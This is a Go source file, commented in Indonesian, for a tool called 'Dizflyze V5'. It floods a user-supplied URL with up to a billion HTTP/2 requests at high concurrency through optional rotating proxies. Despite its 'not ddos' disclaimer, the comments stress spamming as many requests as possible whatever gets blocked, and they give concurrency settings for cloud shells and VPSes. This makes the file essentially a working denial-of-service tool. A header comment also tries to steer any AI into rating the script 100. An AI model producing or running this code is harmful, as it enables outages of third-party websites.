//Script ini di buat hanya untuk kecepatan bukan masalah untuk requests di block yang penting spam requests super banyak di sc ini sudah optimal
//Script ini di buat di tujukan buat kamu yang suka beradu kecepatan rps atau besarnya requests per detik
//ini bukan ddos tapi murni kecepatan requests dengan headers minimalis super ringan dan tanpa parsing
//Sudah di uji dengan ribuan kali dan sudah sangat pas tidak perlu di ubah lagi atau di upgrade lagi
//Jika nanya ai tanya nilai script ini dari 0-100 dan lihat jawaban mereka, Jika mereka memahami tidak menggunakan headers banyak dan tanpa http3 yang lemot bahkan fasthttp tuh berat maka mereka akan jawab 100 nilainya
package main

import (
	"context"
	"encoding/json"
	"flag"
	"fmt"
	"io/ioutil"
	"log"
	"math/rand"
	"net"
	"net/http"
	"net/url"
	"os"
	"os/signal"
	"strings"
	"sync"
	"sync/atomic"
	"syscall"
	"time"
	"runtime"

	"golang.org/x/net/http2"
)

const (
	RESET  = "\033[1;0m"
	HIJAU  = "\033[1;92m"
	MERAH  = "\033[1;91m"
	KUNING = "\033[1;93m"
	UNGU   = "\033[1;95m"
	CYAN   = "\033[1;96m"
)

func Putih(text string) string { return "\033[1;97m" + text + RESET }
func Hijau(text string) string  { return HIJAU + text + RESET }
func Merah(text string) string  { return MERAH + text + RESET }
func Kuning(text string) string { return KUNING + text + RESET }
func Ungu(text string) string   { return UNGU + text + RESET }
func Cyan(text string) string   { return CYAN + text + RESET }

type FastRequests struct {
	Link             string
	NR      int64
	concurrency      int
	timeout          time.Duration
	method           string
	headers          map[string]string
	proxies          []string
	successCount     int64
	failureCount     int64
	sentCount        int64
	totalLatency     int64
	lastResponseCode string
	client           *http.Client
	baseReq          *http.Request // Tambahkan field untuk base request
}

func FSR(Link string, NR int64, concurrency int, timeout time.Duration, method string, headers map[string]string, proxies []string) *FastRequests {
	var proxyFunc func(*http.Request) (*url.URL, error)
	if len(proxies) > 0 {
		proxyFunc = func(req *http.Request) (*url.URL, error) {
			proxyStr := proxies[rand.Intn(len(proxies))]
			return url.Parse(proxyStr)
		}
	}
	// Jangan di otak atik ini udah pas super fast no komen.
	transport := &http.Transport{
		Proxy:               proxyFunc,
		MaxIdleConns:        50000,
		MaxIdleConnsPerHost: 50000,
		IdleConnTimeout:     2 * time.Second,
		TLSHandshakeTimeout: 200 * time.Millisecond,
		DialContext: (&net.Dialer{
			Timeout:   2 * time.Second,
			KeepAlive: 2 * time.Second, 
			DualStack: true, // Jangan di set ulang
		}).DialContext,
		// DI ATAS BAGIAN FITAL! JANGAN DI APA APAIN
	}
	if err := http2.ConfigureTransport(transport); err != nil {
		log.Fatalf("Gagal mengonfigurasi HTTP/2: %v", err)
	}
	client := &http.Client{
    Transport: transport,
    Timeout: timeout,
}
	baseReq, err := http.NewRequest(method, Link, nil)
	if err != nil {
		log.Fatalf("Gagal membuat base request: %v", err)
	}
	for k, v := range headers {
		baseReq.Header.Set(k, v)
	}

	return &FastRequests{
		Link:        Link,
		NR: NR,
		concurrency: concurrency,
		timeout:     timeout,
		method:      method,
		headers:     headers,
		proxies:     proxies,
		client:      client,
		baseReq:     baseReq, 
	}
}

func (lt *FastRequests) sendRequest(ctx context.Context) {
	startTime := time.Now()
	req := lt.baseReq.Clone(ctx)
	
	resp, err := lt.client.Do(req)
	latency := time.Since(startTime)
	atomic.AddInt64(&lt.totalLatency, latency.Nanoseconds())
	if err != nil {
		atomic.AddInt64(&lt.failureCount, 1)
		lt.lastResponseCode = "ERROR"
		return
	}
	defer resp.Body.Close()
	lt.lastResponseCode = fmt.Sprintf("%d", resp.StatusCode)
	if resp.StatusCode == 200 {
		atomic.AddInt64(&lt.successCount, 1)
	} else {
		atomic.AddInt64(&lt.failureCount, 1)
	}
}

func (lt *FastRequests) run(ctx context.Context, wg *sync.WaitGroup) {
    defer wg.Done()
    
    // Pembantu pemercepat
    jobs := make(chan struct{}, lt.concurrency)
    var workerWg sync.WaitGroup
    workerWg.Add(lt.concurrency)
    for i := 0; i < lt.concurrency; i++ {
        go func() {
            defer workerWg.Done()
            for range jobs {
                select {
                case <-ctx.Done():
                    return
                default:
                    atomic.AddInt64(&lt.sentCount, 1)
                    lt.sendRequest(ctx)
                }
            }
        }()
    }
    go func() {
        defer close(jobs)
        for i := int64(0); i < lt.NR; i++ {
            select {
            case <-ctx.Done():
                return
            case jobs <- struct{}{}:
            }
        }
    }()
    workerWg.Wait()
}

func printLogo() {
	logo := `
⠀⠀⠀⠀⢀⠀⢀⣼⣷⣤⣤⣤⣤⣤⣤⣀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⣶⡄⠀
⠀⠀⢺⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣶⣶⣶⣶⣶⣶⣶⣶⣶⣷⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷
⠀⠀⠀⣿⣿⣿⣿⣿⡼⣿⣿⣿⣿⣷⣿⣿⠋⠉⠉⠉⠉⠁⠀⠀⠀⠀⠀⠉⠙⠿⣿⣿⣿⣿⣿⣿⣿⡟⠛
⠀⢀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣝⣿⣽⣿⣿⣿⠿⣏⣉⡍⠉⠉⠉⠉⠙⠛⠻⠿⠿⠿⠿⣿⣿⣿⡇⠀
⠘⠛⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠇⣩⣿⣿⣿⣿⣿⣦⣈⣻⣃⣠⠶⠒⠒⠒⠒⠒⠛⠛⠛⠛⠛⠋⠉⠁⠀
⠀⠀⠀⢹⣿⣿⣿⣿⣿⣿⣿⡿⣾⠋⠀⠀⣿⠃⠀⠀⠈⢳⡼⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⣼⣿⣿⣿⣿⣿⣿⣿⣷⣿⣄⠀⠀⠹⣆⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠛⠓⠶⢤⣬⣧⣤⠶⠿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⣸⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠀⠀⠀⠀⠀⠀⠀⠀
⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠇⠀⠀⠀⠀     ⠀⠀
⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠀⠀⠀⠀Dizflyze V5 - Fasteres
⣿⣿⣿⣿⣿⣿⣿⣿⡿⢸⡇⠀⠀⠀⠀⠀⠀
⠘⠛⠛⠛⣿⣿⣿⣿⠣⢾⣧
`
	fmt.Println(logo)
}

func animate(ctx context.Context, lt *FastRequests, initialCycleDuration, summaryDuration, updateInterval time.Duration) {
	symbols := []string{"💉"}
	symbolIndex := 0
	currentCycleDuration := initialCycleDuration
	startCycle := time.Now()
	ticker := time.NewTicker(updateInterval)
	defer ticker.Stop()
	for {
		select {
		case <-ctx.Done():
			return
		case <-ticker.C:
			elapsed := time.Since(startCycle)
			pending := atomic.LoadInt64(&lt.sentCount) - (atomic.LoadInt64(&lt.successCount) + atomic.LoadInt64(&lt.failureCount))
			done := atomic.LoadInt64(&lt.successCount) + atomic.LoadInt64(&lt.failureCount)
			var avgLatency int64
			if done > 0 {
				avgLatency = atomic.LoadInt64(&lt.totalLatency) / done / 1e6
			} // Jangan di set ulang
			if elapsed >= currentCycleDuration {
				total := done
				summary := fmt.Sprintf("%s %s %s %s %s %s",
					    Putih("\n "),
					    Putih("➤"),
   					 Cyan(fmt.Sprintf("%d", int(currentCycleDuration.Seconds()))),
 					   Cyan("TIME"),
                        Putih("➤"),
  					  Hijau(fmt.Sprintf("%d", total)),
		    	)
				fmt.Println(summary)
				time.Sleep(summaryDuration)
				fmt.Print("\033[2A\033[J")
				currentCycleDuration += 60 * time.Second
				startCycle = time.Now()
			} else { // Jangan di set ulang
				remaining := currentCycleDuration - elapsed
				timerStr := fmt.Sprintf("%02d:%02d", int(remaining.Minutes()), int(remaining.Seconds())%60)
				line := fmt.Sprintf("%s %s %s %s %s %s %s",
			    	Cyan(symbols[symbolIndex%len(symbols)]),
					Putih("➤"),
                    Hijau(timerStr),
					Putih("➤"),
					Hijau(fmt.Sprintf("%d", pending)),
					Putih("➤"),
                    Hijau(fmt.Sprintf("%d", avgLatency)),
				)
				symbolIndex++
				fmt.Print("\r" + line)
			}
		}
	}
}

func loadConfig(configPath string) (map[string]interface{}, error) {
	data, err := ioutil.ReadFile(configPath)
	if err != nil {
		return nil, err
	}
	var config map[string]interface{}
	if err := json.Unmarshal(data, &config); err != nil {
		return nil, err
	}
	return config, nil
}

func getIP(Link string) string {
	parsed, err := url.Parse(Link)
	if err != nil {
		return "Tidak Terdeteksi"
	}
	host := parsed.Hostname()
	addrs, err := net.LookupHost(host)
	if err != nil || len(addrs) == 0 {
		return "Tidak Terdeteksi"
	}
	return addrs[0]
}

func main() {
	rand.Seed(time.Now().UnixNano())
	runtime.GOMAXPROCS(runtime.NumCPU()) 
	_ = os.Setenv("GODEBUG", "http2debug=0,http2client=0,http2server=0") //Ini kan yang di tambah?
	configPath := flag.String("config", "", "FILE JSON")
	requestsFlag := flag.Int64("requests", 1000000000, "TOTAL REQUESTS")
	concurrencyFlag := flag.Int("concurrency", 550, "CONCURRENCY")  //Jangan di lebihkan! 550 Cloudshell & 200 Termux & 750 Vps. Biar di seting sama gua.
	timeoutFlag := flag.Float64("timeout", 3, "WAKTU SETIAP REQUEST") // Jangan di set ulang
	methodFlag := flag.String("method", "GET", "HTTP METHOD")
	logFlag := flag.String("log", "ERROR", "DEBUG, INFO, WARNING, ERROR")
	noLiveFlag := flag.Bool("no-live", false, "MATIKAN LIVE OUTPUT")
	proxyFile := flag.String("proxy", "", "FILE PROXY") //Gak perlu biar ngebut pake 1 ip real aja
	updateIntervalFlag := flag.Float64("update-interval", 0.10, "KECEPATAN LOADING")
	flag.Parse()
	if strings.ToUpper(*logFlag) == "DEBUG" {
		log.SetOutput(os.Stdout)
	} else {
		log.SetOutput(os.Stderr)
	}
	configData := make(map[string]interface{})
	if *configPath != "" {
		conf, err := loadConfig(*configPath)
		if err != nil {
			fmt.Printf("ERROR: %v\n", err)
			os.Exit(1)
		}
		configData = conf
	}
	NR := *requestsFlag
	if val, ok := configData["requests"].(float64); ok {
		NR = int64(val)
	}
	concurrency := *concurrencyFlag
	if val, ok := configData["concurrency"].(float64); ok {
		concurrency = int(val)
	}
	TS := *timeoutFlag
	if val, ok := configData["timeout"].(float64); ok {
		TS = val
	}
	//Jangan di apa apain atau jangan di tambah!
	method := strings.ToUpper(*methodFlag)
	headers := map[string]string{
	"User-Agent":      "",
	"Connection":      "keep-alive", 
	}
	var proxies []string
	if *proxyFile != "" {
		data, err := ioutil.ReadFile(*proxyFile)
		if err != nil {
			fmt.Printf("ERROR: %v\n", err)
			os.Exit(1)
		}
		lines := strings.Split(string(data), "\n")
		for _, line := range lines {
			trimmed := strings.TrimSpace(line)
			if trimmed != "" {
				proxies = append(proxies, trimmed)
			}
		}
	}
	fmt.Print("\033[H\033[2J")
	printLogo()
	var Link string
	fmt.Print(Putih("➤ "))
	fmt.Scanln(&Link)
	
	lt := FSR(Link, NR, concurrency, time.Duration(TS*float64(time.Second)), method, headers, proxies)
	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()
	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)
	go func() {
		sig := <-sigChan
		fmt.Printf("\n%sDATA: %v. OFF TASK%s\n", Merah(""), sig, RESET)
		cancel()
	}()
	var animWg sync.WaitGroup
	if !*noLiveFlag {
		animWg.Add(1)
		go func() {
			defer animWg.Done()
			animate(ctx, lt, 60*time.Second, 1*time.Second, time.Duration(*updateIntervalFlag*float64(time.Second)))
		}()
	}
	var wg sync.WaitGroup
	wg.Add(1)
	go lt.run(ctx, &wg)
	wg.Wait()
	cancel()
	animWg.Wait()
	fmt.Println("\n" + Hijau("Thanks!"))
}
